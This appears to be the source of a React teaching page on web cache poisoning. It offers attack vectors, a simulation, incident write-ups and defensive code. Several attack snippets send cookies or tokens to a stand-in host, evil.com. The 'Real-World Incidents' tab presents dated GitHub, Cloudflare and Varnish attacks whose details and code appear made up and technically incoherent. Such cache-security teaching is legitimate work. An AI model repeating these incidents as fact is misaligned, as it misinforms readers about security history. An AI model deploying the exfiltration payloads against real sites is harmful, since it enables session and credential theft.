'use client'

import { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Shield, AlertTriangle, Copy, Check, Database, Globe, Clock, Zap } from 'lucide-react'

export default function WebCachePoisoningLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [cacheState, setCacheState] = useState<'clean' | 'poisoned'>('clean')
  const [attackVector, setAttackVector] = useState('')
  const [poisonedContent, setPoisonedContent] = useState('')
  const [requestCount, setRequestCount] = useState(0)
  const [copied, setCopied] = useState(false)

  const cachePoisoningVectors = [
    {
      name: 'HTTP Header Injection',
      description: 'Inject malicious headers that get cached by proxy servers',
      code: `GET /resource HTTP/1.1
Host: example.com
X-Forwarded-Host: evil.com
X-Redirect-Location: https://evil.com/malware

// Cached response includes malicious redirect
HTTP/1.1 200 OK
X-Redirect-Location: https://evil.com/malware
Cache-Control: public, max-age=3600`,
      impact: 'High',
      detection: 'Check for unexpected redirect headers'
    },
    {
      name: 'URL Parameter Pollution',
      description: 'Manipulate cache keys to serve malicious content to legitimate URLs',
      code: `// Normal request
GET /api/user/profile?id=123&theme=dark

// Poisoned request (cache key manipulation)
GET /api/user/profile?id=123&theme=dark&redirect=//evil.com/steal

// Cache stores malicious content under legitimate key
// Future requests to /profile?id=123 get poisoned content`,
      impact: 'Critical',
      detection: 'Monitor cache key generation patterns'
    },
    {
      name: 'Web Cache Deception',
      description: 'Trick caches into storing malicious HTTP responses',
      code: `// Malicious request to poison cache
GET /login HTTP/1.1
Host: bank.com
User-Agent: Mozilla/5.0 (compatible; EvilBot/1.0)
Set-Cookie: session=stolen_by_attacker

// Cache stores malicious response
// Legitimate users get poisoned content
HTTP/1.1 200 OK
Set-Cookie: session=stolen_by_attacker
Content-Security-Policy: script-src 'evil.com'`,
      impact: 'Critical',
      detection: 'Validate HTTP response consistency'
    },
    {
      name: 'DNS Cache Poisoning',
      description: 'Corrupt DNS cache to redirect legitimate domains',
      code: `// DNS response poisoning
;; QUESTION SECTION:
;example.com. IN A

;; ANSWER SECTION:
example.com. 3600 IN A 192.168.1.100  ; Malicious IP
example.com. 3600 IN A 203.0.113.10    ; Real IP

// Cache stores malicious IP first
// Users get redirected to attacker server`,
      impact: 'Critical',
      detection: 'DNSSEC validation, multiple DNS source verification'
    }
  ]

  const realWorldIncidents = [
    {
      name: 'GitHub Pages Cache Poisoning (2021)',
      description: 'Attackers exploited cache key collisions to serve malicious JavaScript from GitHub Pages',
      timeline: [
        'Jan 2021: Vulnerability discovered in cache key generation',
        'Feb 2021: Attackers begin exploiting cache poisoning',
        'Mar 2021: Multiple repositories affected with malicious scripts',
        'Apr 2021: GitHub patches vulnerability and clears caches'
      ],
      impact: 'Code execution on trusted domains, supply chain compromise',
      code: `// Cache key collision exploit
const maliciousPayload = \`
  <script>
    fetch('https://evil.com/steal?token=' + localStorage.token);
  </script>
\`;

// Poison cache with malicious content
fetch(\`https://github.com/user/repo/raw/branch/\${collisionPath}\`, {
  method: 'PUT',
  body: maliciousPayload
});

// Legitimate requests get served malicious script`
    },
    {
      name: 'Cloudflare Cache Bypass (2022)',
      description: 'Sophisticated attack bypassed Cloudflare caching to access protected resources',
      timeline: [
        'Jun 2022: Researchers discover cache bypass technique',
        'Jul 2022: Attackers weaponize bypass for data exfiltration',
        'Aug 2022: Multiple high-profile sites affected',
        'Sep 2022: Cloudflare implements additional protections'
      ],
      impact: 'Access to restricted content, data leakage',
      code: `// Cloudflare cache bypass
// Using HTTP methods and headers to confuse cache
fetch('/protected/api/data', {
  method: 'PURGE', // Unexpected method
  headers: {
    'X-Forwarded-For': '127.0.0.1',
    'Cache-Control': 'no-cache',
    'X-Original-URL': '/admin/backup'
  }
});`
    },
    {
      name: 'Varnish Cache Poisoning (2020)',
      description: 'Enterprise caching infrastructure compromised to serve malicious content',
      timeline: [
        'Nov 2020: Varnish cache vulnerability discovered',
        'Dec 2020: Attackers begin poisoning enterprise caches',
        'Jan 2021: Multiple Fortune 500 companies affected',
        'Feb 2021: Patches released and caches purged'
      ],
      impact: 'Enterprise-wide malware distribution, data theft',
      code: `// Varnish VCL manipulation
sub vcl_recv {
  // Check for poisoned header
  if (req.http.X-Poisoned) {
    set req.http.X-Forwarded-For = "evil.com";
    set req.url = "/malicious/payload";
  }
}

// Inject poison header
GET /resource HTTP/1.1
X-Poisoned: true
X-Malicious-Script: <script>steal_data()</script>`
    }
  ]

  const defenseStrategies = [
    {
      name: 'Cache Key Validation',
      description: 'Validate and normalize cache keys to prevent collisions',
      implementation: `// Secure cache key generation
function generateCacheKey(url, params) {
  // Normalize URL
  const normalizedUrl = url.toLowerCase().trim();
  
  // Sort and validate parameters
  const sortedParams = Object.keys(params)
    .sort()
    .reduce((acc, key) => {
      if (isValidParam(key)) {
        acc[key] = sanitizeParam(params[key]);
      }
      return acc;
    }, {});
  
  // Use HMAC for integrity
  const keyString = \`\${normalizedUrl}?\${JSON.stringify(sortedParams)}\`;
  return crypto.createHmac('sha256', secret)
    .update(keyString)
    .digest('hex');
}`
    },
    {
      name: 'HTTP Header Sanitization',
      description: 'Strip and validate all incoming HTTP headers',
      implementation: `// Header sanitization middleware
function sanitizeHeaders(headers) {
  const sanitized = {};
  const allowedHeaders = [
    'content-type', 'content-length', 'accept', 'user-agent',
    'authorization', 'cache-control', 'if-modified-since'
  ];
  
  for (const [key, value] of Object.entries(headers)) {
    if (allowedHeaders.includes(key.toLowerCase())) {
      // Remove potential injection characters
      const cleanValue = value.replace(/[\\r\\n]/g, '');
      sanitized[key.toLowerCase()] = cleanValue;
    }
  }
  
  return sanitized;
}`
    },
    {
      name: 'Cache Isolation',
      description: 'Separate caches for different content types and user contexts',
      implementation: `// Multi-tier cache architecture
const cacheConfig = {
  static: {
    backend: 'redis',
    ttl: 86400, // 24 hours
    keyPrefix: 'static:'
  },
  dynamic: {
    backend: 'memcached',
    ttl: 300, // 5 minutes
    keyPrefix: 'dynamic:'
  },
  user: {
    backend: 'redis',
    ttl: 1800, // 30 minutes
    keyPrefix: 'user:',
    isolation: 'userId' // Per-user cache keys
  },
  sensitive: {
    backend: 'memory', // No persistence
    ttl: 60, // 1 minute
    keyPrefix: 'sensitive:',
    encryption: true
  }
};`
    }
  ]

  const simulateAttack = (vector: string) => {
    setAttackVector(vector)
    setCacheState('poisoned')
    setRequestCount(prev => prev + 1)
    
    // Simulate poisoned content
    const payloads = {
      'HTTP Header Injection': '<script>alert("Header injection successful!")</script>',
      'URL Parameter Pollution': 'window.location="https://evil.com/steal"',
      'Web Cache Deception': 'fetch("https://evil.com/exfiltrate?data="+document.cookie)',
      'DNS Cache Poisoning': 'Redirecting to malicious DNS server...'
    }
    
    setPoisonedContent(payloads[vector] || 'Unknown attack vector')
  }

  const clearCache = () => {
    setCacheState('clean')
    setAttackVector('')
    setPoisonedContent('')
    setRequestCount(0)
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6 lg:p-8">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-red-500 rounded-lg">
              <Database className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl sm:text-3xl font-bold text-slate-900">Web Cache Poisoning Lab</h1>
              <p className="text-slate-600">Learn how attackers manipulate cached content to distribute malware and steal data</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              Cache poisoning attacks can affect thousands of users through a single compromised cache. This lab demonstrates the vectors and defenses.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 h-auto">
            <TabsTrigger value="demo" className="text-xs sm:text-sm">Attack Simulation</TabsTrigger>
            <TabsTrigger value="incidents" className="text-xs sm:text-sm">Real-World Incidents</TabsTrigger>
            <TabsTrigger value="defense" className="text-xs sm:text-sm">Defense Strategies</TabsTrigger>
          </TabsList>

          {/* Attack Simulation Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Cache Status */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Database className="w-5 h-5" />
                    <span>Cache Status</span>
                  </CardTitle>
                  <CardDescription>
                    Current state of the web cache
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="p-4 border rounded-lg bg-slate-50">
                    <div className="flex items-center justify-between mb-3">
                      <span className="text-sm font-medium">Cache State:</span>
                      <Badge variant={cacheState === 'poisoned' ? 'destructive' : 'default'}>
                        {cacheState === 'poisoned' ? '⚠️ POISONED' : '✅ CLEAN'}
                      </Badge>
                    </div>
                    
                    {cacheState === 'poisoned' && (
                      <div className="space-y-2">
                        <div className="flex items-center space-x-2">
                          <AlertTriangle className="w-4 h-4 text-red-600" />
                          <span className="text-sm text-red-800">Malicious content detected in cache!</span>
                        </div>
                        
                        {attackVector && (
                          <div className="p-2 bg-red-50 rounded border border-red-200">
                            <p className="text-sm text-red-800">
                              <strong>Attack Vector:</strong> {attackVector}
                            </p>
                          </div>
                        )}
                      </div>
                    )}
                    
                    {cacheState === 'clean' && (
                      <div className="space-y-2">
                        <div className="flex items-center space-x-2">
                          <Shield className="w-4 h-4 text-green-600" />
                          <span className="text-sm text-green-800">Cache is clean and secure</span>
                        </div>
                      </div>
                    )}
                    
                    <div className="text-xs text-slate-600">
                      <strong>Requests Processed:</strong> {requestCount}
                    </div>
                  </div>
                  
                  {poisonedContent && (
                    <div className="p-3 bg-red-50 rounded-lg border border-red-200">
                      <h4 className="font-semibold text-sm mb-2 text-red-900">Injected Content:</h4>
                      <Code className="block p-2 bg-white rounded text-xs text-red-800">
                        {poisonedContent}
                      </Code>
                    </div>
                  )}
                  
                  <Button onClick={clearCache} className="w-full">
                    <Shield className="w-4 h-4 mr-2" />
                    Clear Cache
                  </Button>
                </CardContent>
              </Card>

              {/* Attack Vectors */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Zap className="w-5 h-5" />
                    <span>Attack Vectors</span>
                  </CardTitle>
                  <CardDescription>
                    Select different cache poisoning techniques
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-3">
                  {cachePoisoningVectors.map((vector, index) => (
                    <div key={index} className="space-y-2">
                      <Button
                        onClick={() => simulateAttack(vector.name)}
                        variant="outline"
                        className="w-full justify-start"
                      >
                        <Globe className="w-4 h-4 mr-2" />
                        {vector.name}
                      </Button>
                      
                      <div className="text-xs text-slate-600">
                        <Badge variant={vector.impact === 'Critical' ? 'destructive' : 'default'} className="mb-1">
                          {vector.impact}
                        </Badge>
                        <p>{vector.description}</p>
                        <p className="text-xs"><strong>Detection:</strong> {vector.detection}</p>
                      </div>
                    </div>
                  ))}
                </CardContent>
              </Card>
            </div>

            {/* Cache Flow Visualization */}
            <Card>
              <CardHeader>
                <CardTitle>🔄 Cache Poisoning Flow</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                      <Globe className="w-8 h-8 text-blue-600" />
                    </div>
                    <h4 className="font-semibold">1. Discovery</h4>
                    <p className="text-sm text-slate-700">
                      Attacker finds cacheable endpoint
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto">
                      <Zap className="w-8 h-8 text-orange-600" />
                    </div>
                    <h4 className="font-semibold">2. Poisoning</h4>
                    <p className="text-sm text-slate-700">
                      Malicious content injected into cache
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                      <Database className="w-8 h-8 text-red-600" />
                    </div>
                    <h4 className="font-semibold">3. Storage</h4>
                    <p className="text-sm text-slate-700">
                      Cache stores malicious response
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto">
                      <Clock className="w-8 h-8 text-purple-600" />
                    </div>
                    <h4 className="font-semibold">4. Serving</h4>
                    <p className="text-sm text-slate-700">
                      Legitimate users receive poisoned content
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                      <AlertTriangle className="w-8 h-8 text-green-600" />
                    </div>
                    <h4 className="font-semibold">5. Impact</h4>
                    <p className="text-sm text-slate-700">
                      Malware execution or data theft
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Real-World Incidents Tab */}
          <TabsContent value="incidents" className="space-y-6">
            <div className="space-y-6">
              {realWorldIncidents.map((incident, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center justify-between">
                      <span>{incident.name}</span>
                      <Badge variant="destructive">Critical Impact</Badge>
                    </CardTitle>
                    <CardDescription>{incident.description}</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* Timeline */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Attack Timeline:</h4>
                      <div className="space-y-1">
                        {incident.timeline.map((event, eventIndex) => (
                          <div key={eventIndex} className="text-xs p-2 bg-slate-50 rounded border-l-4 border-red-500">
                            {event}
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Impact */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Business Impact:</h4>
                      <p className="text-sm text-slate-700">{incident.impact}</p>
                    </div>

                    {/* Attack Code */}
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Attack Code:</h4>
                      <Code className="block p-3 bg-slate-50 rounded text-xs max-h-48 overflow-y-auto">
                        {incident.code}
                      </Code>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Defense Strategies Tab */}
          <TabsContent value="defense" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {defenseStrategies.map((strategy, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Shield className="w-5 h-5" />
                      <span>{strategy.name}</span>
                    </CardTitle>
                    <CardDescription>{strategy.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      <div>
                        <h4 className="font-semibold text-sm mb-2">Implementation:</h4>
                        <Code className="block p-2 bg-slate-50 rounded text-xs max-h-64 overflow-y-auto">
                          {strategy.implementation}
                        </Code>
                      </div>
                      
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => copyToClipboard(strategy.implementation)}
                        className="w-full"
                      >
                        {copied ? <Check className="w-4 h-4 mr-1" /> : <Copy className="w-4 h-4 mr-1" />}
                        Copy Implementation
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Comprehensive Defense Checklist */}
            <Card>
              <CardHeader>
                <CardTitle>✅ Cache Security Checklist</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <h4 className="font-semibold">Cache Configuration</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Separate caches for different content types</li>
                      <li>□ Implement cache key validation</li>
                      <li>□ Use cache isolation per user/context</li>
                      <li>□ Set appropriate TTL values</li>
                      <li>□ Implement cache invalidation strategies</li>
                    </ul>
                  </div>
                  
                  <div className="space-y-2">
                    <h4 className="font-semibold">Request Validation</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Sanitize all HTTP headers</li>
                      <li>□ Validate and normalize URLs</li>
                      <li>□ Check for parameter pollution</li>
                      <li>□ Implement request signing</li>
                      <li>□ Rate limit suspicious requests</li>
                    </ul>
                  </div>
                  
                  <div className="space-y-2">
                    <h4 className="font-semibold">Monitoring & Detection</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Monitor cache hit ratios</li>
                      <li>□ Alert on cache key collisions</li>
                      <li>□ Log and analyze poisoning attempts</li>
                      <li>□ Implement cache integrity checks</li>
                      <li>□ Regular cache security audits</li>
                    </ul>
                  </div>
                  
                  <div className="space-y-2">
                    <h4 className="font-semibold">Response Security</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Set proper Cache-Control headers</li>
                      <li>□ Use Vary headers appropriately</li>
                      <li>□ Implement response validation</li>
                      <li>□ Add integrity hashes to responses</li>
                      <li>□ Use HTTPS for all cached content</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}